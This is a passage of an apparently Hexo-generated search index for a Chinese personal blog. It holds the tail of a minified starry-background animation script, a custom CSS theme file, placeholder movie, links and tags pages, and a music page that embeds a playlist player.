h.fillStyle="rgba("+r+","+this.opacity+")",h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()},this.move=function(){this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&&this.reset(),(this.x>n-n/4||this.y<0)&&(this.fadingOut=!0)},setTimeout(function(){o=!1},50)}function m(t){return Math.floor(1e3*Math.random())+1<10*t}function l(t,i){return Math.random()*(i-t)+t}f(),window.addEventListener("resize",f,!1),function(){h=s.getContext("2d");for(var t=0;t<i;t++)c[t]=new y,c[t].reset();u()}(),function t(){document.getElementsByTagName('html')[0].getAttribute('data-theme')=='dark'&&u(),window.requestAnimationFrame(t)}()};dark()]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }  /* 小冰分类分类磁铁黑夜模式适配 *//* 一般状态 */[data-theme="dark"] .magnet_link_context {  background: #1e1e1e;  color: antiquewhite;}/* 鼠标悬浮状态 */[data-theme="dark"] .magnet_link_context:hover {  background: #3ecdf1;  color: #f2f2f2;}/* 自定义字体 */@font-face {  /* 为载入的字体取名字(随意) */  font-family: 'YSHST';  /* 字体文件地址(相对或者绝对路径都可以) */  src: url(/font/优设好身体.woff2);  /* 定义加粗样式(加粗多少) */  font-weight: normal;  /* 定义字体样式(斜体/非斜体) */  font-style: normal;  /* 定义显示样式 */  font-display: block;}/* 翻页按钮居中 */#pagination {  width: 100%;  margin: auto;}/* 一级菜单居中 */#nav .menus_items {  position: absolute !important;  width: fit-content !important;  left: 50% !important;  transform: translateX(-50%) !important;}/* 子菜单横向展示 */#nav .menus_items .menus_item:hover .menus_item_child {  display: flex !important;}/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */.menus_items .menus_item:nth-child(2) .menus_item_child {  left: -125px;}/* 夜间模式菜单栏发光字 */[data-theme="dark"] #nav .site-page,[data-theme="dark"] #nav .menus_items .menus_item .menus_item_child li a {  text-shadow: 0 0 2px rgb(87, 212, 125) !important;}/* 手机端适配 */[data-theme="dark"] #sidebar #sidebar-menus .menus_items .site-page {  text-shadow: 0 0 2px rgb(87, 212, 125) !important;}/* 背景宇宙星光  */#universe{  display: block;  position: fixed;  margin: 0;  padding: 0;  border: 0;  outline: 0;  left: 0;  top: 0;  width: 100%;  height: 100%;  pointer-events: none;  /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */  z-index: -1;}/* 侧边栏个人信息卡片动态渐变色 *//* #aside-content > .card-widget.card-info {  background: linear-gradient(    -45deg,    #e8d8b9,    #eccec5,    #a3e9eb,    #bdbdf0,    #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }} *//* 黑夜模式适配 *//* [data-theme="dark"] #aside-content > .card-widget.card-info {  background: #191919ee;} *//* 个人信息Follow me按钮 *//* #aside-content > .card-widget.card-info > #card-info-btn {  background-color: #3eb8be;  border-radius: 8px;} *//* 鼠标样式 */#cursor {  position: fixed;  width: 16px;  height: 16px;  /* 这里改变跟随的底色 */  background: rgb(66, 166, 224);  border-radius: 8px;  opacity: 0.25;  z-index: 10086;  pointer-events: none;  transition: 0.2s ease-in-out;  transition-property: background, opacity, transform;}#cursor.hidden {  opacity: 0;}#cursor.hover {  opacity: 0.1;  transform: scale(2.5);  -webkit-transform: scale(2.5);  -moz-transform: scale(2.5);  -ms-transform: scale(2.5);  -o-transform: scale(2.5);}#cursor.active {  opacity: 0.5;  transform: scale(0.5);  -webkit-transform: scale(0.5);  -moz-transform: scale(0.5);  -ms-transform: scale(0.5);  -o-transform: scale(0.5);}/* =====================页面样式调节=========================== */:root {  --trans-light: rgba(255, 255, 255, 0.88);  --trans-dark: rgba(25, 25, 25, 0.88);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts > .recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="天太冷了，冻死了，天气暖和再做这块"><a href="#天太冷了，冻死了，天气暖和再做这块" class="headerlink" title="天太冷了，冻死了，天气暖和再做这块"></a>天太冷了，冻死了，天气暖和再做这块</h2>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[<!-- ## 暂时下线    <div id="aplayer-GgHSWTQJ" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="7422861869" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="false" data-listmaxheight="400px" data-preload="none" data-theme="#ad7a86"    ></div> --><!-- ## QQ音乐歌单 --><div id="aplayer-oSEOhviA" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="8708383891" data-server="tencent" data-type="playlist" data-mode="random" data-autoplay="false" data-listmaxheight="340px" data-preload="auto" data-theme="#e3f2f5" data-volume="0.4" mutex="true"></div>]]></content>
      
    </entry>
    
    
  
</search>
